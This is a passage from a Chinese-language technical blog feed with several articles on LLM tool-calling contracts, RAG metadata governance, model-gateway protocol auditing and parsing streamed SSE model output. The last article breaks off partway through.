<h2 id="函数描述不是服务端接口本身"><a href="#函数描述不是服务端接口本身" class="headerlink" title="函数描述不是服务端接口本身"></a>函数描述不是服务端接口本身</h2><p>Function Calling 用 JSON Schema 描述函数参数，模型返回函数名和 JSON arguments。这里最关键的一点是：模型没有执行函数，应用负责解释和调用。官方发布说明也把它描述为把模型能力连接到外部工具&#x2F;API 的方式，并提醒真实世界动作要加入用户确认。</p>
<p>我不会直接用内部 RPC&#x2F;SDK 方法生成 schema。面向模型的工具应是更窄的业务能力，例如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">不暴露 executeSql(sql)，暴露 previewMetric(metric_id, filters)</span><br><span class="line">不暴露 updateJob(raw_config)，暴露 changeJobOwner(job_id, new_owner)</span><br><span class="line">不暴露 httpRequest(url, body)，暴露 getTicket(ticket_id)</span><br></pre></td></tr></table></figure>

<p>窄接口让参数含义、权限对象和副作用可枚举，也减少模型利用通用工具绕过策略的空间。内部服务如何变化，由工具适配层消化，不让模型契约与底层接口一一绑定。</p>
<p>工具注册信息还要有 version、owner、risk_level、timeout、idempotency、required_permissions 和 result_schema。只有 name&#x2F;description&#x2F;parameters，执行器无法知道这个调用能否自动重试、是否需要确认、结果应如何验证。</p>
<h2 id="JSON-Schema-通过不等于参数可用"><a href="#JSON-Schema-通过不等于参数可用" class="headerlink" title="JSON Schema 通过不等于参数可用"></a>JSON Schema 通过不等于参数可用</h2><p>schema 可以检查类型、必填字段、枚举、长度和格式，但很多业务约束依赖当前状态。<code>job_id</code> 符合字符串格式，不代表对象存在；<code>target_state=STOPPED</code> 合法，不代表任务当前允许停止；时间范围合法，也可能超过用户的数据权限。</p>
<p>我把校验拆成三层：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">结构校验：JSON 可解析，字段、类型、枚举和大小符合 schema</span><br><span class="line">对象校验：ID 能解析到唯一对象，版本与环境匹配</span><br><span class="line">策略校验：用户有权限，状态前置成立，风险与配额允许</span><br></pre></td></tr></table></figure>

<p>对象参数优先使用稳定 ID，不让模型传 display name 后由执行器猜。同名任务、同名表在不同项目中非常常见。若用户只给名称，先调用 search&#x2F;resolve 工具返回候选，再让用户或受控规则选择，不能直接进入变更工具。</p>
<p>未知字段默认拒绝。模型可能生成 schema 之外的 <code>force=true</code>，宽松反序列化若悄悄接收，就会把未来字段或拼写错误带入内部 API。工具契约要设置 <code>additionalProperties: false</code>，同时对字符串长度、数组数量和嵌套深度设上限。</p>
<h2 id="权限以调用者和目标对象为准"><a href="#权限以调用者和目标对象为准" class="headerlink" title="权限以调用者和目标对象为准"></a>权限以调用者和目标对象为准</h2><p>工具服务使用自己的服务账户执行，不等于所有用户继承服务账户权限。每次调用携带可信的 user&#x2F;tenant&#x2F;session context，策略根据 action、resource、environment 和当前状态判断。模型生成的 <code>user_id</code> 不能覆盖真实调用者身份。</p>
<p>权限检查放在执行服务内部，而不只在 Agent 编排层。多个客户端都可能调用同一工具，最靠近资源的一层必须兜底。工具返回 <code>PERMISSION_DENIED</code> 时只给必要信息，不暴露“这个用户差哪个管理员角色”之类可被利用的内部细节。</p>
<p>读取型工具也有权限。搜索 Catalog、查看日志、列出工单可能泄露对象存在性。先过滤候选，再返回给模型；不能让模型看完完整数据后决定不说。</p>
<p>对高风险动作增加 approval token。预览接口根据规范化参数生成 plan hash，用户确认后签发短时 token；执行接口校验 token、user、resource version 和 plan hash。模型无法把对 A 的确认复用到 B，也不能在确认后悄悄改参数。</p>
<h2 id="幂等与重试必须写进契约"><a href="#幂等与重试必须写进契约" class="headerlink" title="幂等与重试必须写进契约"></a>幂等与重试必须写进契约</h2><p>模型调用、HTTP 请求和流式连接都可能重试。创建工单、发送通知、重跑任务如果没有幂等键，一次用户意图可能产生多个副作用。</p>
<p>幂等键由编排层基于 <code>run_id + tool_call_id</code> 生成，不由模型自由填写。工具服务保存 key、参数哈希和结果。相同 key、相同参数返回之前结果；相同 key、不同参数返回冲突。只有查询类和明确声明 retryable 的错误允许自动重试。</p>
<p>timeout 也不等于失败。客户端 30 秒没收到响应，服务端可能已经完成动作。执行器先用 idempotency key 查询状态，再决定重试。将所有超时交给模型“重新调用一次”，会制造最难排查的重复操作。</p>
<p>长任务返回 operation ID，而不是一直占着函数调用。后续用 <code>get_operation</code> 查询明确状态：accepted、running、succeeded、failed、cancelled。模型可以解释进度，不能把 accepted 写成已完成。</p>
<h2 id="工具结果需要有限、稳定的错误语义"><a href="#工具结果需要有限、稳定的错误语义" class="headerlink" title="工具结果需要有限、稳定的错误语义"></a>工具结果需要有限、稳定的错误语义</h2><p>把 Java 堆栈、SQL 错误和下游 HTTP body 原样返回模型，会泄露内部路径、密钥片段和对象信息，也会让模型根据偶然文案采取不稳定动作。工具结果应有固定 envelope：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;failed&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;error_code&quot;</span><span class="punctuation">:</span> <span class="string">&quot;STATE_CONFLICT&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;任务已进入结束状态&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;retryable&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;operation_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;op_...&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;evidence_ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;audit_...&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>错误码面向调用者语义，不直接复刻底层异常类。执行服务保留 cause chain，通过 evidence_ref 给运维人员查看。模型只基于 <code>retryable</code> 和允许的 recovery actions 决策，不能看到 timeout 字样就默认重试。</p>
<p>成功结果也要验证 schema。下游接口返回 HTTP 200 但缺关键字段，仍然是协议失败；创建任务返回 ID 后，可按风险选择回读确认。编排器分别记录 call accepted、execution succeeded 和 business state verified，不把它们压成一个 success。</p>
<h2 id="一次调用必须能完整复盘"><a href="#一次调用必须能完整复盘" class="headerlink" title="一次调用必须能完整复盘"></a>一次调用必须能完整复盘</h2><p>审计链从 user request 开始，包含模型与版本、工具定义版本、proposal、规范化参数、策略结果、确认记录、idempotency key、下游 request ID、原始&#x2F;归一化结果和最终回答。敏感字段按 schema 标记后脱敏，不能靠日志平台事后正则猜。</p>
<p>评测用例不只看参数 JSON 是否匹配。要覆盖该拒绝时是否拒绝、歧义对象是否追问、权限失败是否停止、超时是否查状态、确认后参数是否保持、重复事件是否只执行一次。工具版本升级时，用固定 proposal 和模拟下游回放。</p>
<p>OpenAI 的发布说明同时提到模型版本可以 pin，并提醒模型升级可能在部分任务上退化。工具调用更需要固定 model snapshot、schema version 与评测结果。通用模型别名变化前，先跑自己的调用集，不把供应商平均指标当生产保证。</p>
<p>Function Calling 给了模型一套更可靠的表达方式。把它变成企业工具能力，还需要执行契约来守住身份、对象、权限、状态和副作用。模型可以提出下一步，真正改变系统状态的决定必须由确定性代码和可审计规则完成。</p>
<h2 id="对照官方资料"><a href="#对照官方资料" class="headerlink" title="对照官方资料"></a>对照官方资料</h2><ul>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023-06-13 Function Calling 发布说明</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-core">JSON Schema 2020-12 Core：schema、vocabulary 与实例验证基础</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：类型、枚举、required 等校验关键字</a></li>
<li><a href="https://spec.openapis.org/oas/v3.0.3">OpenAPI 3.0.3：Operation、Parameter 与 Schema Object</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Function Calling</tag>
        <tag>工具调用</tag>
        <tag>Agent</tag>
      </tags>
  </entry>
  <entry>
    <title>RAG 效果的上限，往往卡在元数据而不是模型</title>
    <url>//2023/05/14/rag-metadata-ceiling/</url>
    <content><![CDATA[<p>知识问答效果不好时，团队第一反应通常是换 embedding、调 top-k 或升级模型。我在数据平台场景里遇到的更多情况是：被索引的元数据本身不完整、没有版本，甚至彼此冲突。检索与生成只能重新排列现有信息，不能凭空修复事实链。</p>
<p>RAG 的上限取决于它能拿到什么证据。表名和描述只是最薄的一层；对象身份、来源、有效时间、负责人、血缘、权限和采集状态，决定答案能否从“听起来合理”走到“可以复核”。</p>
<p class="article-diagram-scroll"><img src="/images/articles/rag-metadata-ceiling.svg" class="lazyload" data-srcset="/images/articles/rag-metadata-ceiling.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="RAG 的上限由元数据事实链决定"></p>
<span id="more"></span>

<h2 id="同名对象先要有稳定身份"><a href="#同名对象先要有稳定身份" class="headerlink" title="同名对象先要有稳定身份"></a>同名对象先要有稳定身份</h2><p>企业里出现多个 <code>orders</code> 很正常：生产与测试、Hive 与 MySQL、旧集群与新集群、原始层与服务层。把每张表的 <code>name + description</code> 做 embedding，召回时很难区分它们。模型看见三个相似片段后，往往会把 owner、字段和环境拼成一个不存在的对象。</p>
<p>索引单元必须绑定 Catalog entity ID 与 qualifiedName。Apache Atlas 的 Hive 模型用 <code>db.table@cluster</code> 形成 table qualifiedName，并以唯一属性去重。展示名称可以改，稳定身份不能跟着 UI 文案漂移。</p>
<p>我会在每个检索片段中保存 <code>entity_guid</code>、<code>qualified_name</code>、<code>entity_type</code>、<code>source_system</code>、<code>environment</code> 和 <code>metadata_version</code>。生成上下文按 entity 分组，禁止跨实体合并属性。用户没有指定环境时，列出候选而不是默认 production。</p>
<p>别名与业务术语也是关系，不是改名。一个 glossary term 可以关联多个物理表，一个表也可能承载多个业务概念。问“客户订单”时先找到术语，再沿关系到认证资产；仅用表名向量相似度，会把命名习惯当成业务定义。</p>
<h2 id="元数据需要来源和证据等级"><a href="#元数据需要来源和证据等级" class="headerlink" title="元数据需要来源和证据等级"></a>元数据需要来源和证据等级</h2><p>owner 可能来自 DDL、任务配置、组织系统或人工填写；description 可能来自注释，也可能是运营同学补录。不同来源冲突时，索引若只保留最终字符串，就无法决定哪个更可信。</p>
<p>每个属性应携带 provenance：source、collector、observed_at、source_version、confidence，以及是否经过人工认证。规则可以定义组织系统的在职负责人高于旧 DDL owner，认证指标定义高于临时文档。模型不参与决定事实优先级，只解释规则选出的结果。</p>
<p>采集失败不能沿用旧值而不标记。Hook 消息积压、Catalog API 超时、代码解析失败时，旧元数据仍可展示，但 freshness 状态应变成 stale。答案说“负责人是 A”与“最近一次成功采集显示负责人是 A，已 30 天未更新”不是同一可信度。</p>
<p>RAG 索引也要保存 source content hash。源属性变化后触发对应 chunks 重建；若采集到空值，需要判断是合法清空还是采集异常。简单 upsert 空字符串会把已有事实抹掉，简单忽略又会永久保留过期信息。</p>
<h2 id="时间是事实的一部分"><a href="#时间是事实的一部分" class="headerlink" title="时间是事实的一部分"></a>时间是事实的一部分</h2><p>用户问“这个表由谁负责”，常默认现在；问“去年故障时谁负责”，需要历史有效期。Catalog 只保存当前 owner，RAG 再强也回答不了历史问题。</p>
<p>我倾向于用双时间：<code>valid_from/to</code> 表示事实何时在业务上有效，<code>observed_at</code> 表示平台何时采集到。组织调整在 5 月 1 日生效、5 月 3 日才同步，两个时间都要保留。查询“5 月 2 日”按 valid time 判断，同时可解释当时平台是否已观测。</p>
<p>文档也有时间。制度 v2 替代 v1 后，旧版本不应参与“当前规则”召回，但历史问题仍可能需要它。索引过滤根据 query intent 选择有效版本；用户没给时间时默认 current，并把知识更新时间放进答案。</p>
<p>删除要用 tombstone 表达，不立即失去历史身份。物理表下线后，当前搜索默认隐藏，血缘和事故审计仍能引用它。若向量库直接删掉且 Catalog 没历史，旧任务日志里的表名会变成无法解释的孤儿。</p>
<h2 id="血缘质量决定“为什么”的回答"><a href="#血缘质量决定“为什么”的回答" class="headerlink" title="血缘质量决定“为什么”的回答"></a>血缘质量决定“为什么”的回答</h2><p>表结构能回答有哪些字段，血缘和过程元数据才能回答数据从哪里来、为什么变化。SQL parser 解析的列级血缘、运行时 Hook 采集的输入输出、人工声明的逻辑关系，证据强度不同。</p>
<p>我会把 edge 当一等对象：source&#x2F;target entity、process&#x2F;run、expression、collector、observed time 和 status 都要保存。只存 <code>A -&gt; B</code>，无法解释是每天真实运行、代码静态推断，还是一次临时查询留下的关系。</p>
<p>RAG 生成血缘说明时，先从图查询拿到受权限过滤的路径，再把实体描述和 process 证据组合成上下文。不要让模型从多个表描述中猜关系。Atlas 的实体模型把 process 的 inputs&#x2F;outputs 作为关系保存，这类结构化事实比文本相似度更适合回答路径问题。</p>
<p>图中断边要明确显示。上游 A 到中间 B 有证据，B 到 C 缺失时，答案不能把 A 直接说成 C 的确定上游。可以提示“当前 Catalog 未采集到完整链路”，并把缺口转成治理任务。</p>
<h2 id="权限元数据错误比召回错误更危险"><a href="#权限元数据错误比召回错误更危险" class="headerlink" title="权限元数据错误比召回错误更危险"></a>权限元数据错误比召回错误更危险</h2><p>知识库索引权限标签若比源系统更新慢，用户可能召回刚被撤权的文档或表说明。权限不能只在导入时复制一次，需要事件同步、版本和失效窗口。</p>
<p>每次查询携带 subject、tenant、purpose 与 policy version。检索前按当前策略过滤 entity&#x2F;chunk，生成前复核，点击引用时回源再次鉴权。缓存 key 也要包含权限上下文，不能把管理员查询结果复用给普通用户。</p>
<p>列级与行级权限会影响答案含义。用户能知道某表存在，但不能看到敏感列；系统应返回授权后的 schema，并说明部分字段不可见。用完整 schema 生成 SQL、最后再删结果列，会泄露字段名与统计特征。</p>
<p>权限采集失败采用 fail closed 还是保留旧快照，要按数据域定义。敏感域倾向 fail closed；普通技术文档可以短时间沿用 last-known-good，但答案标记策略版本和陈旧状态。</p>
<h2 id="先治理高价值事实，不追求一次补全"><a href="#先治理高价值事实，不追求一次补全" class="headerlink" title="先治理高价值事实，不追求一次补全"></a>先治理高价值事实，不追求一次补全</h2><p>元数据治理很容易变成填表运动。我的优先顺序由真实问题驱动：先统计用户最常问、最常答错的对象与属性，再补 owner、环境、业务定义、认证状态、上下游和更新时间。</p>
<p>每个答案反馈都落到缺失类型：对象没采集、身份冲突、属性为空、来源冲突、关系断裂、权限异常、版本过期。治理团队看到的是可修复的事实问题，不是一个模糊的“RAG 效果差”。</p>
<p>评测也按 metadata ceiling 分层。给定正确证据时模型能否答对，是生成能力；现有 Catalog 能否提供正确证据，是知识覆盖；检索能否找到，是索引能力。若知识覆盖只有 60%，模型准确率不可能通过调 Prompt 达到 90%。</p>
<p>我不会等 Catalog 完美后才上线 RAG，但会让系统暴露缺口。答案只使用有来源的事实，过期和冲突明确标注，无法确认就拒答。这样知识问答一边服务用户，一边成为元数据质量的观测入口。</p>
<p>更大的模型可以改善表达和推理，更好的向量模型可以改善召回，但对象身份、版本、时间、来源和权限仍必须由数据平台提供。RAG 的工程价值，恰恰是把这些底层事实以自然方式交给用户，而不是把元数据问题藏进一段流畅文本。</p>
<h2 id="对照源码与论文"><a href="#对照源码与论文" class="headerlink" title="对照源码与论文"></a>对照源码与论文</h2><ul>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/Hook/HookHive.md#L18-L56">Apache Atlas 2.2.0 Hive 元数据模型：实体属性、inputs&#x2F;outputs 与 qualifiedName</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/docs/src/documents/TypeSystem.md">Apache Atlas 2.2.0 类型系统：Entity、Classification、Relationship 等模型</a></li>
<li><a href="https://arxiv.org/abs/2005.11401">Retrieval-Augmented Generation：参数化模型与外部非参数记忆</a></li>
<li><a href="https://arxiv.org/abs/2009.02252">KILT：把知识密集型任务与可验证来源对齐的基准</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Atlas</tag>
        <tag>RAG</tag>
        <tag>元数据治理</tag>
      </tags>
  </entry>
  <entry>
    <title>模型网关别只做字段搬运：协议转换必须留下双轨审计</title>
    <url>//2023/07/04/model-gateway-protocol-audit/</url>
    <content><![CDATA[<p>模型网关第一版通常很像反向代理：统一鉴权，替换 endpoint，把 <code>messages</code> 转给不同供应商。真正接入多个模型后，会发现最难的不是请求字段，而是每家对流式增量、结束原因、工具调用、错误和用量的表达都不同。</p>
<p>如果网关只输出一套“看起来统一”的 JSON，却不保存转换前证据，线上出现空回答、工具参数残缺或 HTTP 200 后中途断流时，无法判断问题来自供应商、适配器还是客户端。我会同时保留原生协议轨和统一语义轨，两者用同一个 request ID 关联。</p>
<p class="article-diagram-scroll"><img src="/images/articles/model-gateway-protocol-audit.svg" class="lazyload" data-srcset="/images/articles/model-gateway-protocol-audit.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="模型网关的双轨协议审计"></p>
<span id="more"></span>

<h2 id="先做能力矩阵，再做路由"><a href="#先做能力矩阵，再做路由" class="headerlink" title="先做能力矩阵，再做路由"></a>先做能力矩阵，再做路由</h2><p>不能假设所有 chat 模型都支持同一组参数。是否支持 system message、function calling、stream、最大上下文、JSON 输出、停止序列和固定版本，都要按 provider&#x2F;model snapshot 记录。</p>
<p>客户端请求先解析为 capability requirements，例如 <code>needs_tools=true</code>、<code>stream=true</code>、<code>min_context=8k</code>。路由器只在满足要求的模型中选择；没有匹配项就明确失败，不把 tools 字段悄悄删除后当普通聊天发送。</p>
<p>矩阵来自真实探测和官方版本说明，不靠模型名推断。OpenAI 2023 年 6 月的发布说明只把函数调用能力明确给到 <code>gpt-4-0613</code>、<code>gpt-3.5-turbo-0613</code> 等版本，同时允许 pin model version。使用通用别名时，网关要记录最终实际模型；对关键业务我倾向固定 snapshot，评测通过后再升级。</p>
<p>参数转换也要暴露降级。例如供应商不支持某个 sampling 字段，网关可以按明确策略拒绝或忽略，但响应 metadata 必须列出 <code>dropped_parameters</code>。无声降级会让调用方以为配置生效，A&#x2F;B 实验结论也会失真。</p>
<h2 id="原生轨保存事实，统一轨服务业务"><a href="#原生轨保存事实，统一轨服务业务" class="headerlink" title="原生轨保存事实，统一轨服务业务"></a>原生轨保存事实，统一轨服务业务</h2><p>原生轨包含最终 URL 的 provider 标识、请求字段摘要、HTTP status&#x2F;headers、响应 body 或流事件、provider request ID 与接收时间。秘密和敏感内容按字段策略脱敏，但结构、事件顺序和未知字段必须保留。</p>
<p>统一轨只表达业务真正需要的概念：assistant text delta、function call、usage、finish reason、provider error、gateway error。每个统一事件带 native event reference，出现转换争议时能回到原始片段。</p>
<p>不要为了统一而删除无法映射的信息。供应商新增 finish reason 或 event type 时，适配器输出 <code>unknown</code> 加 native value，监控告警；不能默认映射成 stop。未知意味着协议发生了变化，属于需要处理的信号。</p>
<p>原始内容的保存周期按数据敏感性控制。可以只保存加密 payload、结构化字段与 hash，在线排障通过授权临时解密。完全不存会失去审计，永久明文保存又扩大风险。policy version 也要记录，说明当时哪些字段被采集和脱敏。</p>
<h2 id="HTTP-成功和模型成功是两层状态"><a href="#HTTP-成功和模型成功是两层状态" class="headerlink" title="HTTP 成功和模型成功是两层状态"></a>HTTP 成功和模型成功是两层状态</h2><p>HTTP 200 只说明服务器接受并开始返回成功响应，不保证流完整，也不保证模型产生可用结果。非流式 body 可能缺 choices，流式连接可能在终态事件前中断，function arguments 可能不是完整 JSON。</p>
<p>我会把结果拆成：transport status、provider protocol status、model finish status、gateway normalization status。比如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">HTTP=200</span><br><span class="line">provider_stream=closed_without_finish</span><br><span class="line">normalized_output=incomplete</span><br><span class="line">client_status=retryable_unknown</span><br></pre></td></tr></table></figure>

<p>这样告警不会把所有问题归成 5xx。RFC 9110 定义了 HTTP 状态语义，但应用协议仍需自行验证响应结构。对 429&#x2F;5xx 的重试也不能只看状态码，还要结合方法幂等性、provider request ID、Retry-After 和调用是否已经产生计费&#x2F;副作用。</p>
<p>错误响应要分 provider 与 gateway。鉴权缺失、路由无可用模型、schema 转换失败属于网关；配额、模型不存在、内容策略或上游超时属于供应商。统一 error code 之外保留 native code&#x2F;message hash，排障和供应商对账才有依据。</p>
<h2 id="Finish-Reason-是控制信号"><a href="#Finish-Reason-是控制信号" class="headerlink" title="Finish Reason 是控制信号"></a>Finish Reason 是控制信号</h2><p>finish reason 不只是统计字段。stop 表示正常结束，length 表示达到长度限制，function_call 表示等待应用执行工具，content filter 则可能没有完整文本。网关若统一成 <code>completed=true</code>，上层会把截断答案展示为最终结果，或忽略待执行的函数。</p>
<p>统一协议定义有限状态：<code>completed</code>、<code>requires_action</code>、<code>truncated</code>、<code>blocked</code>、<code>failed</code>、<code>incomplete</code>。每个 provider adapter 对 finish reason 做显式映射，映射表带版本并覆盖测试。新增原生值必须让测试失败，而不是落入默认分支。</p>
<p>工具参数在流中可能分段到达，只有终态确认后才解析完整 JSON。中间 delta 可以给 UI 展示，但不能提前触发工具。非流式同样要检查 function name 在请求允许列表、arguments 符合 schema，再交给工具执行层。</p>
<p>usage 也不能强行同义。有的供应商返回 prompt&#x2F;completion tokens，有的只在末尾返回，有的暂时缺失。统一字段允许 null，附计量来源和单位。拿字符数估算可以作为 <code>estimated_usage</code>，不能覆盖 provider reported usage。</p>
<h2 id="转换规则要能离线回放"><a href="#转换规则要能离线回放" class="headerlink" title="转换规则要能离线回放"></a>转换规则要能离线回放</h2><p>每个适配器准备一组 raw fixtures：正常文本、空 delta、unicode、多 choice、function call 分片、length、拒绝、429、5xx、中途断流和未知字段。测试把固定原生输入转换为统一事件，断言事件序列和最终状态。</p>
<p>线上遇到新响应时，去敏后加入回归集。修复转换器后对历史 raw events 重放，确认只改变目标案例。若只有最终统一结果，没有原始事件，就无法验证修复是否真的覆盖生产形态。</p>
<p>请求侧也做 golden tests。同一 unified request 在不同 adapter 下生成预期 native body，明确默认值和删除字段。升级 SDK 前跑 diff，避免 SDK 自动改字段名或序列化 null，网关代码看似没变，线上请求却变了。</p>
<p>协议版本独立于网关服务版本。响应携带 <code>gateway_protocol_version</code> 和 <code>adapter_version</code>，客户端可以按版本兼容。大规模字段迁移先双写旧&#x2F;新格式，观察消费者，再下线旧版本。</p>
<h2 id="端到端-Trace-不能在流里断掉"><a href="#端到端-Trace-不能在流里断掉" class="headerlink" title="端到端 Trace 不能在流里断掉"></a>端到端 Trace 不能在流里断掉</h2><p>网关生成全局 request ID，并把能传递的 trace header 送到供应商；拿到 provider request ID 后关联保存。客户端断开、网关取消、上游实际停止是三个事件，各自记录时间。</p>
<p>排障至少能串起：调用方、路由决策、模型 snapshot、请求变换、首字节时间、原生事件、统一事件、结束原因、usage 与最终持久化结果。只打“request success, latency&#x3D;2s”无法解释用户为何看到半句话。</p>
<p>模型网关的价值不是隐藏所有差异，而是把差异变成受控、可观测的适配。统一协议让业务少写供应商分支，原生证据让平台在出错时不失明。两条轨道同时存在，才能安全演进模型与 API。</p>
<h2 id="对照规范与官方资料"><a href="#对照规范与官方资料" class="headerlink" title="对照规范与官方资料"></a>对照规范与官方资料</h2><ul>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023-06-13 API 更新：Function Calling、模型版本 pin 与升级说明</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc9110">RFC 9110：HTTP Semantics 与状态码定义</a></li>
<li><a href="https://html.spec.whatwg.org/multipage/server-sent-events.html">WHATWG Server-Sent Events：<code>text/event-stream</code> 与事件解析格式</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-core">JSON Schema 2020-12 Core：实例与 schema 的协议基础</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>可观测性</tag>
        <tag>模型网关</tag>
        <tag>协议适配</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型流式输出怎么接：不要把 TCP chunk 当成一条消息</title>
    <url>//2023/07/05/llm-streaming-event-protocol/</url>
    <content><![CDATA[<p>模型开启 <code>stream=true</code> 后，客户端能更早看到文字，接口看起来只是从一次 JSON 响应变成多次回调。实现里最常见的 bug，是每收到一个网络 chunk 就 <code>JSON.parse</code>，或者把每个 <code>data:</code> 行当成完整业务消息。</p>
<p>TCP&#x2F;HTTP 传输分片、SSE 事件和模型增量是三层边界。它们恰好可能对齐，但协议从未保证对齐。我会先把字节流解析成完整 SSE event，再把供应商 event 归一化，最后由状态归并器构造答案。</p>
<p class="article-diagram-scroll"><img src="/images/articles/llm-streaming-event-protocol.svg" class="lazyload" data-srcset="/images/articles/llm-streaming-event-protocol.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="流式响应按事件归并，不按 TCP chunk 拼字符串"></p>
<span id="more"></span>

<h2 id="网络-chunk-不是消息边界"><a href="#网络-chunk-不是消息边界" class="headerlink" title="网络 chunk 不是消息边界"></a>网络 chunk 不是消息边界</h2><p>一次 socket read 可能只拿到半个 UTF-8 字符、半行 JSON，也可能同时拿到三个 SSE events。代理、TLS record、缓冲策略和网络状况都会改变分片。下面这段逻辑在本机常常能跑，线上一定会遇到偶发解析失败：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">onChunk(bytes) -&gt; decode -&gt; split(&quot;data:&quot;) -&gt; JSON.parse</span><br></pre></td></tr></table></figure>

<p>正确做法先用增量 UTF-8 decoder 处理跨 chunk 字符，再维护行缓冲，按 SSE 空行识别 event。WHATWG 规范定义 <code>text/event-stream</code>，event 由字段行组成，连续多个 <code>data</code> 字段要用换行合并，<code>id</code> 和 <code>event</code> 也有独立语义。</p>
<p>解析器需要覆盖 CRLF、LF、注释心跳、空 data、多行 data 和末尾无完整事件。不能用 <code>readLine()</code> 后只取第一行 data。代理插入注释保活时，客户端应忽略而不是当模型空输出。</p>
<p>SSE parser 只负责协议框架，不应该认识 choices 或 function_call。这样同一解析器可以用固定规范样例测试，供应商 adapter 再处理 data payload。</p>
<h2 id="模型-delta-必须进入状态归并器"><a href="#模型-delta-必须进入状态归并器" class="headerlink" title="模型 delta 必须进入状态归并器"></a>模型 delta 必须进入状态归并器</h2><p>每个供应商 event 可能只带 role、一个文本片段、函数名片段、arguments 片段或 finish reason。客户端不能假设每帧都有相同字段，也不能把缺失字段当空值覆盖已有状态。</p>
<p>归并器以 <code>choice/index</code> 或供应商等价标识维护状态：role 只设置一次，content 按顺序追加，function name 与 arguments 分别累积，finish reason 只能在终态写入。每个输入事件分配单调 seq，重复事件按 event ID 或 seq 去重。</p>
<p>工具 arguments 尤其不能边收边执行。一段 JSON 可能被拆成：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;&quot;job_id&quot;:&quot;j</span><br><span class="line">ob_12&quot;,&quot;date&quot;:&quot;2023-</span><br><span class="line">07-01&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>中途不仅无法解析，字符串内容也可能跨帧。等到 finish reason 表示 function call 完成后，再解析完整 JSON、做 schema&#x2F;权限校验。UI 可以显示“正在准备工具参数”，不要把未闭合 JSON 直接展示给用户。</p>
<p>归并规则必须版本化。Function Calling 刚上线，供应商格式仍可能调整；未知 delta 字段保留到 native payload，并触发观测，不让默认反序列化悄悄丢掉。</p>
<h2 id="流结束不等于回答完成"><a href="#流结束不等于回答完成" class="headerlink" title="流结束不等于回答完成"></a>流结束不等于回答完成</h2><p>连接 EOF 有多种含义：正常收到终止标记后关闭、客户端主动取消、网关超时、上游断开、代理重置。只有看到协议约定的终态并通过完整性检查，才能标 completed。</p>
<p>我会维护以下终态：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">completed        正常 finish，文本或工具调用完整</span><br><span class="line">truncated        模型达到长度限制</span><br><span class="line">blocked          内容策略或供应商明确阻断</span><br><span class="line">cancelled        调用方主动取消且已传播</span><br><span class="line">incomplete       连接结束但没有可信终态</span><br><span class="line">failed           协议或执行错误</span><br></pre></td></tr></table></figure>

<p>HTTP 200 后断流属于 incomplete，不是 success。页面可以保留已收到文本并标“输出未完成”，持久化层不能把它当正常 assistant message 供下一轮上下文使用。否则下一轮模型会基于半句继续，错误会扩散。</p>
<p>finish reason 与最后一个文本 delta 也可能分开。归并器先接收终态事件，再统一 finalize；不要收到空 content 就提前结束，也不要等连接关闭才更新 UI。</p>
<h2 id="取消和超时要传到上游"><a href="#取消和超时要传到上游" class="headerlink" title="取消和超时要传到上游"></a>取消和超时要传到上游</h2><p>用户关掉页面只断开浏览器连接，如果网关仍读取供应商流，资源和费用会继续。客户端 disconnect 触发 cancellation token，网关关闭上游 body&#x2F;连接，并记录 cancel_requested 与 provider_stream_closed 的时间差。</p>
<p>首字节超时、event idle timeout 和总 deadline 应分开。模型两秒没有首字节与生成中十秒无事件是不同问题；长回答可能持续正常输出，但仍需总时限。心跳注释是否重置 idle timeout，要在协议里明确。</p>
<p>自动重连并不总是安全。WHATWG EventSource 支持 <code>Last-Event-ID</code>，但模型 API 未必支持从特定 event 恢复。同一请求重新发起可能生成不同文本并重复计费。除非供应商明确支持 resumable stream，否则断流后标 incomplete，由用户重新请求或由上层创建新 attempt。</p>
<p>若产品需要“看起来继续”，也要把旧 attempt 与新 attempt 分开，不能把两个生成结果无痕拼接。新请求可携带已完成上下文，最终答案标明重试并重新验证。</p>
